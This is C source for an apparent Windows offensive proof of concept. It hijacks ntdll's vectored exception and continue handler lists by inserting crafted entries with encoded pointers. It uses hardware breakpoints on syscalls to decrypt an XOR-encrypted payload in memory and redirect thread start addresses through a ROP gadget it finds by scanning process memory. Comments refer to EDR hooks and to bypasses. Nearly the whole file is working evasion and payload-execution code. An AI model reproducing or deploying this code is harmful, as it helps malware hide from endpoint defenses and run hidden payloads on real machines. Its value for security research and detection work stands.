            // // PAGE_EXECUTE_WRITECOPY, 
            // &oldPal); // The old protection attributes
            // if(status != STATUS_SUCCESS) {
            //     printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
            // } else {
            //     printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldPal));
            //     printf("[+] Global dllEntryPoint1 memory set to PAGE_EXECUTE_READ (%#x)\n", GetLastError());
            // }
            // getchar();

            // If you want to play with it, but it is not useful for BaseThreadInitThunk
            // e->ContextRecord->Rax = 0xC0000156; // STATUS too many secrets.


		} 
        else {
            e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
            e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr_global;
            e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR0;
            e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR1;
            printf("[-_-] Wrong place for breakpoint triggered at address: %p\n", e->ExceptionRecord->ExceptionAddress);
            // printf("[+] After change: e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
            // printf("[+] After change: e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
            // printf("[+] After change: e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);
            e->ContextRecord->EFlags |= (1 << 8); 
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        
        return EXCEPTION_CONTINUE_EXECUTION;
	}

	e->ContextRecord->EFlags |= (1 << 16);  // set the ResumeFlag (FR) in EFlags register to continue execution, otherwise we have a loop.
	//e->ContextRecord->Rip++;						//use instruction pointer to skip the loop
    
	
    return EXCEPTION_CONTINUE_SEARCH;
    // return EXCEPTION_CONTINUE_EXECUTION;
}


// exception handler for hardware breakpoints
LONG WINAPI BreakpointDr1Handler(PEXCEPTION_POINTERS e)
{
    // printf("[+] !!!!!!!!!!!!! Hard BreakpointHandler\n");
    // // print the e->ExceptionRecord->ExceptionCode
    // printf("[+] Exception code: %x\n", e->ExceptionRecord->ExceptionCode);


    
    
    // else if (e->ExceptionRecord->ExceptionCode == STATUS_ACCESS_VIOLATION) {
    //     printf("[+] Access violation at address: %p\n", e->ExceptionRecord->ExceptionAddress);
    //     return EXCEPTION_CONTINUE_SEARCH;
    // } 
    
    if (e->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {

	    // // hardware breakpoints trigger a single step exception
        // printf("[+] Single step exception at address: %p\n", e->ExceptionRecord->ExceptionAddress);
        // printf("[+] e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
        // printf("[+] e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
        // printf("[+] e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);
        // //printf syscall_addr:
        // printf("[+] syscall_addr_global: %p\n", syscall_addr_global);
        e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
        e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr_global;
        e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR0;
        e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR1;
        
        //print CURRENT_EXCEPTION_INSTRUCTION_PTR:
        // printf("[+] CURRENT_EXCEPTION_INSTRUCTION_PTR: %p\n", CURRENT_EXCEPTION_INSTRUCTION_PTR);
        // if(CURRENT_EXCEPTION_INSTRUCTION_PTR != e->ContextRecord->Dr0) //Rip == Dr0-> ?
        // {   
        //     printf("[+] Rip != Dr0\n");
        //     e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
        //     e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr_global;
        //     e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR0;
        //     e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR1;
        //     printf("[+] e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
        //     printf("[+] e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
        //     printf("[+] e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);


        //     e->ContextRecord->EFlags |= SINGLE_STEP_FLAG;
        //     return EXCEPTION_CONTINUE_SEARCH;
        // }        

   
		// this exception was caused by DR1 (syscall ret breakpoint)
		// if (e->ContextRecord->Dr6 & 0x2) {
        if (CURRENT_EXCEPTION_INSTRUCTION_PTR == e->ContextRecord->Dr1) {
			printf("[^_^] syscall ret breakpoint triggered at address: 0x%llx\n",
				   (DWORD64)e->ExceptionRecord->ExceptionAddress);
            // use VirtualProcect to restore memory page to RX,
            // XOR magic code
            //Call NtResumeThread at magicCode address
            printf("[+] Restoring payload memory access and decrypting\n");
            DWORD oldPal = 0;
            // Change the memory back to XR for execution...
            VirtualProtect(dllEntryPoint1, dll_len, PAGE_READWRITE, &oldPal);
            sUrprise((char *) dllEntryPoint1, dll_len, key, sizeof(key));

            
            VirtualProtect(dllEntryPoint1, dll_len, PAGE_EXECUTE_READ, &oldPal);
            printf("[+] Global dllEntryPoint1 memory set to PAGE_EXECUTE_READ (%#x)\n", GetLastError());


            printf("[+] Rcx: %p\n", e->ContextRecord->Rcx);
            printf("[+] Rdx before change: %p\n", e->ContextRecord->Rdx);
            printf("[+] R8: %p\n", e->ContextRecord->R8);
            printf("[+] R9: %p\n", e->ContextRecord->R9);
            printf("[+] R10: %p\n", e->ContextRecord->R10);
            printf("[+] Rax: %p\n", e->ContextRecord->Rax); 
            // printf("The registers are cleared, there is no need to set them back to original values. \n");



            // context.Rsp points to the top of the stack TOGO: 
            // DWORD64 *fifthArgAddr = (DWORD64 *)(e->ContextRecord->Rsp + 0x28); 
            // printf("[+] Rsp + 0x28 before change: %p\n", *fifthArgAddr);
            // *fifthArgAddr = (DWORD64)globalPointer; // Set your value
            // // // print the value of 0x28 after the Rsp:k
            // printf("[+] Rsp + 0x28 after change: %p\n", *fifthArgAddr);

            //Change rdx for NaseTjreadInitThunk, Rdx stores the value of Thread Start Address that will be passed on to Rcx later.:
			// e->ContextRecord->Rdx = (DWORD64)dllEntryPoint1; // 1st arg
            // printf("[+] Rdx changed to: %p\n", e->ContextRecord->Rdx);
            // // globalPointer = (PVOID)0X88888;
            // // e->ContextRecord->Rdx = (DWORD64)globalPointer; // 1st arg

            searchForROPGadget();
            e->ContextRecord->Rdx = (DWORD64)foundRemoteAddress; // The start address
            // e->ContextRecord->Rip = (DWORD64)foundRemoteAddress; // This works but will change the calling sequences. 
            // e->ContextRecord->Rax = (DWORD64)dllEntryPoint1;
            e->ContextRecord->R11 = (DWORD64)dllEntryPoint1; //It is safe to use caller saved register R11 for the real start address.
            
            // e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
            e->ContextRecord->Dr1 = (DWORD64)0;
            // e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR0;
            e->ContextRecord->Dr7 &= DEBUG_REGISTER_EXEC_DR1; // clear the local bit
            printf("[+] After change: e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
            printf("[+] After change: e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
            printf("[+] After change: e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);
			// e->ContextRecord->Rax = (DWORD64)dllEntryPoint1; // change Rax to real start Addr, PVOID lpStartAddress

            // Code can be executed with Rip as well....
			// e->ContextRecord->Rip = (DWORD64)dllEntryPoint1; // change 5th to real start Addr, PVOID lpStartAddress

            // NTSTATUS status = NtProtectVirtualMemory(
            // GetCurrentProcess(),
            // &dllEntryPoint1, // NtProtectVirtualMemory expects a pointer to the base address
            // &dll_len, // A pointer to the size of the region
            // PAGE_EXECUTE_READ, // The new protection attributes, PAGE_EXECUTE_READ
            // // PAGE_EXECUTE_WRITECOPY, 
            // &oldPal); // The old protection attributes
            // if(status != STATUS_SUCCESS) {
            //     printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
            // } else {
            //     printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldPal));
            //     printf("[+] Global dllEntryPoint1 memory set to PAGE_EXECUTE_READ (%#x)\n", GetLastError());
            // }
            getchar();

            // If you want to play with it, but it is not useful for BaseThreadInitThunk
            // e->ContextRecord->Rax = 0xC0000156; // STATUS too many secrets.


		} 
        else {
            e->ContextRecord->Dr0 = (DWORD64)syscall_addr_global;
            e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr_global;
            e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR0;
            e->ContextRecord->Dr7 = DEBUG_REGISTER_EXEC_DR1;
            printf("[-_-] Wrong place for breakpoint triggered at address: %p\n", e->ExceptionRecord->ExceptionAddress);
            // printf("[+] After change: e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
            // printf("[+] After change: e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
            // printf("[+] After change: e->ContextRecord->Dr7: %p\n", e->ContextRecord->Dr7);
            e->ContextRecord->EFlags |= (1 << 8); 
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        
        return EXCEPTION_CONTINUE_EXECUTION;
	}

	e->ContextRecord->EFlags |= (1 << 16);  // set the ResumeFlag (FR) in EFlags register to continue execution, otherwise we have a loop.
	//e->ContextRecord->Rip++;						//use instruction pointer to skip the loop
    
	
    return EXCEPTION_CONTINUE_SEARCH;
    // return EXCEPTION_CONTINUE_EXECUTION;
}

//POC handlers return different messages
LONG WINAPI benignExceptionHandler(PEXCEPTION_POINTERS Info)
{
	printf("HELLO FROM A ORIGINAL VEH!\n");
    printf("[+] Original Exception (VEH): 0x%0.8X\n", Info->ExceptionRecord->ExceptionCode);
	return EXCEPTION_CONTINUE_EXECUTION;
}


//Get the VA for a section in ntdll
//Taken from here: https://github.com/rad9800/misc/blob/main/bypasses/ClearVeh.c
BOOL getNtdllSectionVa(PCSTR sectionName, PVOID* sectionVa, DWORD* sectionSz)
{
	const LIST_ENTRY* head = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList;
	LIST_ENTRY* next = head->Flink;

	while (next != head)
	{
		LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(next, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

		const UNICODE_STRING* basename = (UNICODE_STRING*)((BYTE*)&entry->FullDllName + sizeof(UNICODE_STRING));

		if (_wcsicmp(basename->Buffer, L"ntdll.dll") == 0)
		{
			PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((ULONG_PTR)entry->DllBase + ((PIMAGE_DOS_HEADER)entry->DllBase)->e_lfanew);

			for (int j = 0; j < nt->FileHeader.NumberOfSections; j++) {
				const PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(nt) + (DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * j);

				// if (_stricmp(section->Name, sectionName) == 0) {
                if (_stricmp((const char*)section->Name, sectionName) == 0) {


					*sectionVa = (PVOID)((ULONG_PTR)entry->DllBase + section->VirtualAddress);
					*sectionSz = section->Misc.VirtualSize;

					return TRUE;
				}
			}

		}
		next = next->Flink;
	}
	return FALSE;
}




PVOID InjectHandlerEntry(PVOID exceptionHandler, BOOL isVeh) {

	PVOID sectionVa;
	DWORD sectionSz; 
	DWORD oldProtect;

	BOOL isServer = checkIfServer();

	// BOOL isServer = FALSE;

    PVOID LdrpList = isVeh ? findLdrpVectorHandlerList() : findLdrpVectorContinueHandlerList();

    if (LdrpList != NULL) {
        printf("[+] %s List: 0x%p\n", isVeh ? "LdrpVectorHandler" : "LdrpVectorContinueHandler", LdrpList);
    } else {
        printf("[-] Couldn't find %s List!\n", isVeh ? "LdrpVectorHandler" : "LdrpVectorContinueHandler");
    }


    // Check for EDR hooks before injecting the handler
    // PLIST_ENTRY listHead = (PLIST_ENTRY)LdrpList;
    // if (listHead->Flink != listHead) {
    //     printf("[!] EDR hooks detected in %s list before injection.\n", isVeh ? "VEH" : "VCH");
    // } else {
    //     printf("[+] No EDR hooks detected in %s list before injection.\n", isVeh ? "VEH" : "VCH");
    // }

    printf("Press any key to continue...\n");
    getchar(); 

    // On Windows 10/11 the VEH list should be in the .mrdata section, on server it will be in the .data section
    getNtdllSectionVa(".mrdata", &sectionVa, &sectionSz);

    if ((uintptr_t)LdrpList > ((uintptr_t)sectionVa) && (uintptr_t)LdrpList < ((uintptr_t)sectionVa + sectionSz)) {
        printf("[*] .mrdata VA: 0x%p Size: %d\n", sectionVa, sectionSz);
    } else {
        getNtdllSectionVa(".data", &sectionVa, &sectionSz);
        printf("[*] Appears to be Server 2012, using .data section instead...\n");
        printf("[*] .data VA: 0x%p Size: %d\n", sectionVa, sectionSz);
    }

	//Set our target section to be READ/WRITE
    // TODO: We can potentially set to change the memeory page protection to PAGE_EXECUTE_READWRITE
    // instead of the whole section. The page, should be 4KB aligned starts from the sectionVa. 
    // Set our target section to be READ/WRITE
    VirtualProtect(sectionVa, sectionSz, PAGE_READWRITE, &oldProtect);

    ULONG cookie;
    ULONG ret;
    HANDLE hHandle = GetCurrentProcess();
    NTSTATUS status = MyNtQueryInformationProcess(hHandle, myProcessCookie, &cookie, sizeof(cookie), &ret);
    if(status != STATUS_SUCCESS) {
        printf("[-] NtQueryInformationProcess failed to get cookie. Status: %x\n", status);
    } else {
        printf("[+] Got cookie: %x\n", cookie);
    }

    // Allocate handler
    PVOID handler = NULL;
    if (isServer) {
        handler = HeapAlloc(GetProcessHeap(), 0, sizeof(VECTXCPT_CALLOUT_ENTRY_SERVER));
		// We assign VEH manually, but VCH using the windows API to muddle the water a bit. 
        if (isVeh) {
            ((PVECTXCPT_CALLOUT_ENTRY_SERVER)handler)->VectoredHandler = (PVECTORED_EXCEPTION_HANDLER)EncodePointers(exceptionHandler, cookie);
        } else {
            ((PVECTXCPT_CALLOUT_ENTRY_SERVER)handler)->VectoredHandler = (PVECTORED_EXCEPTION_HANDLER)EncodePointer(exceptionHandler);
        }
    } else {
        handler = HeapAlloc(GetProcessHeap(), 0, sizeof(VECTXCPT_CALLOUT_ENTRY));
        if (isVeh) {
        //     ((PVECTXCPT_CALLOUT_ENTRY)handler)->VectoredHandler = (PVECTORED_EXCEPTION_HANDLER)EncodePointers(exceptionHandler, cookie);
            ((PVECTXCPT_CALLOUT_ENTRY)handler)->VectoredHandler = (PVECTORED_EXCEPTION_HANDLER)EncodePointer(exceptionHandler);

        } else {
            ((PVECTXCPT_CALLOUT_ENTRY)handler)->VectoredHandler = (PVECTORED_EXCEPTION_HANDLER)EncodePointer(exceptionHandler);
        }
    }

    printf("Original pointer: %p\n", exceptionHandler);
    /// compare the encoded pointer of two different method: ExitProcess(0);
    PVOID point1 = EncodePointers(exceptionHandler, cookie);
    PVOID point2 = EncodePointer(exceptionHandler);
    if(point1 == point2) {
        printf("[+] The encoded pointers are the same\n");
    } else {
        printf("[-] The encoded pointers are different\n");
        getchar();
        ExitProcess(0);
    }

    // Set the reserved field
	//Need to set a valid pointer for the reserved attribute since it gets incremented
    PVOID reserved = HeapAlloc(GetProcessHeap(), 0, 8);
    PLIST_ENTRY pLdrpList = (PLIST_ENTRY)LdrpList;

    // Access the first entry in LdrpVectorList and retrieve its reserved value
    // So it is agreed with other handlers in the list. 
    if (pLdrpList && pLdrpList->Flink != pLdrpList) {
        PVECTXCPT_CALLOUT_ENTRY firstEntry = (PVECTXCPT_CALLOUT_ENTRY)(pLdrpList->Flink);
        reserved = firstEntry->reserved;
    }

    // reserved = (PVOID)(ULONG_PTR)0;
    if (isServer) {
        ((PVECTXCPT_CALLOUT_ENTRY_SERVER)handler)->reserved = reserved;
    } else {
        ((PVECTXCPT_CALLOUT_ENTRY)handler)->reserved = reserved;
    }

	printf("[*] Check the reserved value now for clarity. \n");


    printf("[*] Inserting our handler into the list\n");
    getchar();

    // Hijack handler into the list
    HijackHandlerList((PLIST_ENTRY)LdrpList, (PLIST_ENTRY)handler);
	// Insert the handler to the list without hijcking:
	// InsertHeadList((PLIST_ENTRY)LdrpList, (PLIST_ENTRY)handler);
	// Remove the handler from list to clean up: 
	// UnhijackHandlerList(pLdrpList, (PLIST_ENTRY)handler);

    // Reset our memory protection
    VirtualProtect(sectionVa, sectionSz, oldProtect, &oldProtect);

	return LdrpList; 

}


void InjectVEHEntry() {

	PVOID sectionVa;
	DWORD sectionSz; 
	PLIST_ENTRY next;
	DWORD oldProtect;

	BOOL isServer = checkIfServer();

    /// VEH: 
	PVOID LdrpVectorList = findLdrpVectorHandlerList();

	if (LdrpVectorList != NULL) {
		printf("[*] LdrpVectorList: 0x%p\n", LdrpVectorList);
	}
	else {
		printf("[-] Couldn't find LdrpVectorList!\n");
		return;
	}

    /// VCH: 
    PVOID LdrpVectorContinueList = findLdrpVectorContinueHandlerList();

    if (LdrpVectorContinueList != NULL) {
        printf("[*] LdrpVectorContinueList: 0x%p\n", LdrpVectorContinueList);
    }
    else {
        printf("[-] Couldn't find LdrpVectorContinueList!\n");
        return;
    }

    printf("Press any key to continue...\n");
    getchar();

    
    //On Windows 10/11 the VEH list should be in the .mrdata section, on server it will be in the .data section
    // VEH and VEH share similar structs, so we can use the same function to get the section VA
	getNtdllSectionVa(".mrdata", &sectionVa, &sectionSz);

	if ((uintptr_t)LdrpVectorContinueList > ((uintptr_t)sectionVa) && (uintptr_t)LdrpVectorContinueList < ((uintptr_t)sectionVa + sectionSz)) {
		printf("[*] .mrdata VA: 0x%p Size: %d\n", sectionVa, sectionSz);
	}
	else {
		getNtdllSectionVa(".data", &sectionVa, &sectionSz);
		printf("[*] Appears to be Server 2012, using .data section instead...");
		printf("[*] .data VA: 0x%p Size: %d\n", sectionVa, sectionSz);
	}

	//Set our target section to be READ/WRITE
    // TODO: We can potentially set to change the memeory page protection to PAGE_EXECUTE_READWRITE
    // instead of the whole section. The page, should be 4KB aligned starts from the sectionVa. 
	VirtualProtect(sectionVa, sectionSz, PAGE_READWRITE, &oldProtect);

    //Since the server/workstation structs are slightly different we'll check at each step

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    // if (hNtdll == NULL) {
    //     printf("[-] Failed to get ntdll module handle.\n");
    // }
    // PNtQueryInformationProcess NtQueryInformationProcess = (PNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    // if (!NtQueryInformationProcess) {
    //     printf("[-] Failed to get NtQueryInformationProcess address.\n");
    // }
    DWORD cookie;
    ULONG ret;
    // Handle to the process 
    HANDLE hHandle = GetCurrentProcess();
    // Query the process information to get the cookie value
    MyNtQueryInformationProcess(hHandle, myProcessCookie, &cookie, sizeof(cookie), &ret);
    //Allocate the hanldr on the heap for VEH. 
	PVOID vehHandler = NULL;

	if (isServer) {
		vehHandler = HeapAlloc(GetProcessHeap(), 0, sizeof(VECTXCPT_CALLOUT_ENTRY_SERVER));
	}
	else {
		vehHandler = HeapAlloc(GetProcessHeap(), 0, sizeof(VECTXCPT_CALLOUT_ENTRY));
	}

	if (isServer) {
        // ((PVECTXCPT_CALLOUT_ENTRY_SERVER)vehHandler)->VectoredHandler = (PVECTORED_EXCEPTION_HANDLER)EncodePointer((PVOID)&BreakpointHandlerVeh);
        ((PVECTXCPT_CALLOUT_ENTRY_SERVER)vehHandler)->VectoredHandler = (PVECTORED_EXCEPTION_HANDLER)EncodePointers((PVOID)&BreakpointHandlerVeh, cookie);
	}
	else {
        // ((PVECTXCPT_CALLOUT_ENTRY)vehHandler)->VectoredHandler = (PVECTORED_EXCEPTION_HANDLER)EncodePointer((PVOID)&BreakpointHandlerVeh);
        ((PVECTXCPT_CALLOUT_ENTRY)vehHandler)->VectoredHandler = (PVECTORED_EXCEPTION_HANDLER)EncodePointers((PVOID)&BreakpointHandlerVeh, cookie);
	}

 /// VCH's turn now: 
    PVOID vchHandler = NULL;
	if (isServer) {
		vchHandler = HeapAlloc(GetProcessHeap(), 0, sizeof(VECTXCPT_CALLOUT_ENTRY_SERVER));
	}
	else {
		vchHandler = HeapAlloc(GetProcessHeap(), 0, sizeof(VECTXCPT_CALLOUT_ENTRY));
	}

	if (isServer) {
        ((PVECTXCPT_CALLOUT_ENTRY_SERVER)vchHandler)->VectoredHandler = (PVECTORED_EXCEPTION_HANDLER)EncodePointer((PVOID)&BreakpointHandlerVch);

	}
	else {
        ((PVECTXCPT_CALLOUT_ENTRY)vchHandler)->VectoredHandler = (PVECTORED_EXCEPTION_HANDLER)EncodePointer((PVOID)&BreakpointHandlerVch);
	}

    ///

    // print the original pointer and encoded pointer:
    /// VEH: 
    printf("Original VEH pointer: %p\n", &BreakpointHandlerVeh);
    printf("Encoded VEH pointer: %p\n", EncodePointer((PVOID)&BreakpointHandlerVeh));

    /// VCH: 
    printf("Original VCH pointer: %p\n", &BreakpointHandlerVch);
    printf("Encoded VCH pointer: %p\n", EncodePointer((PVOID)&BreakpointHandlerVch));


	//Need to set a valid pointer for the reserved attribute since it gets incremented
    //VEH: 
	PVOID vehReserved = HeapAlloc(GetProcessHeap(), 0, 8);
    PLIST_ENTRY pLdrpVectorList = (PLIST_ENTRY)LdrpVectorList;

    // Access the first entry in LdrpVectorList and retrieve its reserved value
    if (pLdrpVectorList && pLdrpVectorList->Flink != pLdrpVectorList) {
        PVECTXCPT_CALLOUT_ENTRY firstEntry = (PVECTXCPT_CALLOUT_ENTRY)(pLdrpVectorList->Flink);
        vehReserved = firstEntry->reserved;
    }

	if (isServer) {
		((PVECTXCPT_CALLOUT_ENTRY_SERVER)vehHandler)->reserved = vehReserved;
	}
	else
	{
		((PVECTXCPT_CALLOUT_ENTRY)vehHandler)->reserved = vehReserved;
	}

    //VCH vchReserved: 
	PVOID vchReserved = HeapAlloc(GetProcessHeap(), 0, 8);
	PLIST_ENTRY pLdrpVectorContinueList = (PLIST_ENTRY)LdrpVectorContinueList;

	// Access the first entry in LdrpVectorList and retrieve its reserved value
	if (pLdrpVectorContinueList && pLdrpVectorContinueList->Flink != pLdrpVectorContinueList) {
		PVECTXCPT_CALLOUT_ENTRY firstEntry = (PVECTXCPT_CALLOUT_ENTRY)(pLdrpVectorContinueList->Flink);
		vchReserved = firstEntry->reserved;
	}

	if (isServer) {
		((PVECTXCPT_CALLOUT_ENTRY_SERVER)vchHandler)->reserved = vchReserved;
	}
	else
	{
		((PVECTXCPT_CALLOUT_ENTRY)vchHandler)->reserved = vchReserved;
	}


	printf("[*] Check the reserved value now for clarity. \n");

	printf("[*] Inserting our handler into the list\n");
	getchar();
	//Insert our handler into the list
    // VEH: 
    // InsertHeadList((PLIST_ENTRY)LdrpVectorList, (PLIST_ENTRY)vehHandler);
	HijackHandlerList((PLIST_ENTRY)LdrpVectorList, (PLIST_ENTRY)vehHandler);

	// UnhijackHandlerList((PLIST_ENTRY)LdrpVectorList, (PLIST_ENTRY)vehHandler);
    // VCH: 
    // InsertHeadList((PLIST_ENTRY)LdrpVectorContinueList, (PLIST_ENTRY)vchHandler);
	HijackHandlerList((PLIST_ENTRY)LdrpVectorContinueList, (PLIST_ENTRY)vchHandler);
	// UnhijackHandlerList((PLIST_ENTRY)LdrpVectorContinueList, (PLIST_ENTRY)vchHandler);


	/// check if list has been hijacked: 

    // Cast pLdrpVectorList to PLIST_ENTRY to access Flink and Blink
    PLIST_ENTRY listEntry = (PLIST_ENTRY)pLdrpVectorList;

    // Perform the VEH hook check
    if (listEntry && (PVOID)(listEntry->Flink) != (PVOID)((ULONG_PTR)listEntry + 8)) {
        printf("\r\n[!] VEH hooks present.\r\n");
    } else {
        printf("\r\n[+] No VEH hooks detected.\r\n");
    }

	//Reset our memory protection
    //TODO: 
	VirtualProtect(sectionVa, sectionSz, oldProtect, &oldProtect);

}

/**
 * Code originally proposed by Emeric Nasi. 
* Search bytes in a target process's memory
*/
VOID* ScanTargetProcessMemory(DWORD processID, BYTE* targetData, MEMORY_BASIC_INFORMATION
searchParams)
{
    ULONG_PTR foundOffset = 0;
    char* foundLocalAddress = NULL;
    VOID* foundRemoteAddress = NULL;
    HANDLE processHandle;
    BYTE* memoryBuffer = NULL; // Will be used to read memory chunk by chunk
    size_t bufferSize = sizeof(memoryBuffer);
    size_t bytesToCopy = 0;
    SIZE_T bytesRead = 0;
    BYTE* memoryAddress = NULL;
    MEMORY_BASIC_INFORMATION memInfo;
    printf(" [+] Initiating search in process %d\n", processID);

    /* Open the target process with read mode */
    processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, processID);
    if (processHandle != NULL)
    {
        // Iterate through memory blocks of the target process
        for (memoryAddress = NULL; VirtualQueryEx(processHandle, memoryAddress, &memInfo, sizeof(memInfo)) == sizeof(memInfo);
             memoryAddress += memInfo.RegionSize)
        {
            // Only inspect valid code pages
            BOOL isValidZone = TRUE;
            if (searchParams.State && (memInfo.State != searchParams.State)) isValidZone = FALSE;
            if (searchParams.Type && (memInfo.Type != searchParams.Type)) isValidZone = FALSE;
            if (searchParams.Protect && (memInfo.Protect != searchParams.Protect)) isValidZone = FALSE;

            if (isValidZone == TRUE)
            {
                /* Read and parse the process memory */
                memoryBuffer = (BYTE*)malloc(memInfo.RegionSize + 1);
                memset(memoryBuffer, 0, memInfo.RegionSize + 1);
                printf(" [-] Inspecting memory region: 0x%p\n", (void*)memoryAddress);
                
                if (ReadProcessMemory(processHandle, memoryAddress, memoryBuffer, memInfo.RegionSize, &bytesRead) != 0)
                {
                    foundLocalAddress = (char*)binarySearchString(memoryBuffer, (char*)targetData, memInfo.RegionSize);

                    /* Data found! */
                    if (foundLocalAddress != NULL)
                    {
                        foundOffset = (ULONG_PTR)((BYTE*)foundLocalAddress - memoryBuffer);
                        break;
                    }
                }
                else
                {
                    printf(" [!] Failed to read memory from process\n");
                }
                free(memoryBuffer);
                memoryBuffer = NULL;
            }
        }
        if (foundLocalAddress == NULL)
        {
            printf(" [!] No matching code found\n");
        }
        else
        {
            printf(" [+] Match found at offset 0x%p\n", foundOffset);
            foundRemoteAddress = (VOID*)(memoryAddress + foundOffset);
            printf(" [+] Target code located at 0x%p\n", foundRemoteAddress);
        }
    }
    else
    {
        printf(" [!] Failed to open process %d\n", processID);
    }
    return foundRemoteAddress;
}

//Taken from here and modified: https://github.com/rad9800/misc/blob/main/bypasses/ClearVeh.c
//This function registers a benign VEH handler and uses it to walk through the VEH list
//Once a pointer to NTDLL's .data section is identified, that should be the head of the VEH list

/// This is not always necessary since an static offset is applied from ntdll 
/// once we know the OS version and arch of the target
PVOID findLdrpVectorHandlerList()
{
	BOOL found = FALSE;

	// Register a fake handler
	PVOID dummyHandler = AddVectoredExceptionHandler(0, &benignExceptionHandler);

	if (dummyHandler == NULL) {
		printf("[-] Failed to register a dummy handler");
		return NULL;
	}

	PLIST_ENTRY next = ((PLIST_ENTRY)dummyHandler)->Flink;
	PVOID sectionVa;
	DWORD sectionSz;
	// LdrpVectorHandlerList will be found in the .data section of NTDLL.dll
	if (getNtdllSectionVa(".data", &sectionVa, &sectionSz))
	{
		while ((PVOID)next != dummyHandler)
		{


			// if ((PVOID)next >= sectionVa && 
			// 	(PVOID)next <= (PVOID)((ULONG_PTR)sectionVa + sectionSz)) {
			// 	break;
            // }
			//Check if our address is in the .data section range
			if ((PVOID)next >= sectionVa && (PVOID)next <= (PVOID*)sectionVa + sectionSz)
			{
                printf("[+] Found the LdrpVectorHandlerList\n");
                // print the address:
                printf("[+] LdrpVectorHandlerList: %p\n", next);
				found = TRUE;
				break;
			}

			next = next->Flink;
		}
	}

    /// Alternative method to find the LdrpVectorHandlerList:
    // It is by offset 0x199410 from the ntdll base address.



	// Cleanup
	RemoveVectoredExceptionHandler(dummyHandler);

	return found ? next : NULL;
}

// This function will talk through the .data section of NTDLL.dll to find the LdrpVectorContinueHandlerList
// This list is 0x18 bytes offset from the LdrpVectorHandlerList
PVOID findLdrpVectorContinueHandlerList()
{
	BOOL found = FALSE;

	// Register a fake handler
	PVOID dummyHandler = AddVectoredContinueHandler(0, &benignExceptionHandler);

	if (dummyHandler == NULL) {
		printf("[-] Failed to register a dummy handler");
		return NULL;
	}

	PLIST_ENTRY next = ((PLIST_ENTRY)dummyHandler)->Flink;
	PVOID sectionVa;
	DWORD sectionSz;
	// LdrpVectorHandlerList will be found in the .data section of NTDLL.dll
	if (getNtdllSectionVa(".data", &sectionVa, &sectionSz))
	{
		while ((PVOID)next != dummyHandler)
		{
			//Check if our address is in the .data section range
			if ((PVOID)next >= sectionVa && (PVOID)next <= (PVOID*)sectionVa + sectionSz)
			{
				found = TRUE;
				break;
			}

			next = next->Flink;
		}
	}

	// Cleanup
	RemoveVectoredContinueHandler(dummyHandler);
    /// print if next is found:

	return found ? next : NULL;
}



ADDR *GetNtdllBase() {

    //1st method: 
    // void *ntdllBase = NULL;
    // PPEB_LDR_DATA ldr = NULL;
    // PPEB pPEB = NULL;

    /// get PEB: 
    // #ifdef _WIN64
    //     pPEB = (PPEB)__readgsqword(0x60); // Read PEB address from the GS segment register
    // #else
    //     pPEB = (PPEB)__readfsdword(0x30); // Read PEB address from the FS segment register
    // #endif

    // #ifdef _WIN64
    //     __asm__ volatile (
    //         "movq %%gs:0x60, %0" // Read PEB address from the GS segment register, PEB is pointed by a pointer at offset 0x60 to the TEB. 
    //         : "=r" (pPEB)
    //     );
    // #else
    //     __asm__ volatile (
    //         "movl %%fs:0x30, %0" // Read PEB address from the FS segment register
    //         : "=r" (pPEB)
    //     );
    // #endif
    // // Walk PEB: 
    // DWORD64 qwNtdllBase = (DWORD64)pPEB->Ldr & ~(0x10000 - 1); //Align the Ldr addr to 64kb boundary. 
    // while (1) {
    //     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)qwNtdllBase;
    //     if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) { // contain valid DOS header? 
